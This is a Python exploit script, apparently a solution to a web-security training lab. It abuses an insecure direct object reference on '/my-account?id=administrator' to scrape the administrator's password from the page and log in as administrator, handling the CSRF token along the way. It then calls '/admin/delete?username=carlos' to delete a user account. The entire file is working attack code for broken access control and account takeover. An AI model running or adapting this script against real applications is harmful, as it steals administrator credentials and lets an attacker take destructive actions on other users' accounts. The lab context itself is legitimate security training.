#!/usr/bin/env python3
import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_admin_password(s, url):
    admin_url = url + "/my-account?id=administrator"
    r = s.get(admin_url, verify=False, proxies=proxies)
    if "administrator" in r.text:
        print("[*] Retrieving administrator password...")
    soup = BeautifulSoup(r.text, "html.parser")
    admin_pass = soup.find("input", {"name": "password"})["value"]
    admin_pass = admin_pass.strip()
    print(f"[+] The administrator password is: {admin_pass}")
    if "administrator" in r.text:
        return admin_pass
    return False


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if token:
        return token["value"]
    return None


def login_as_admin(s, url, username):
    login_page = url + "/login"
    csrf = get_csrf_token(s, login_page)
    admin_pass = get_admin_password(s, url)
    data = {"username": username, "password": admin_pass}
    if csrf:
        data["csrf"] = csrf
    r = s.post(login_page, data=data, verify=False, allow_redirects=False, proxies=proxies, timeout=10)
    if r.status_code == 302:
        return True
    return False


def delete_carlos(s, url):
    print("[*] Deleting carlos...")
    r = s.get(url + "/admin/delete?username=carlos", verify=False, proxies=proxies, timeout=10)
    if "Congratulations" in r.text:
        print("[+] Carlos deleted - Lab solved")
        return True
    print("[-] Failed to delete carlos")
    return False


def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if not login_as_admin(s, url, "administrator"):
        print("[-] Login failed")
        return
    print("[+] Logged in as administrator")

    delete_carlos(s, url)


if __name__ == "__main__":
    main()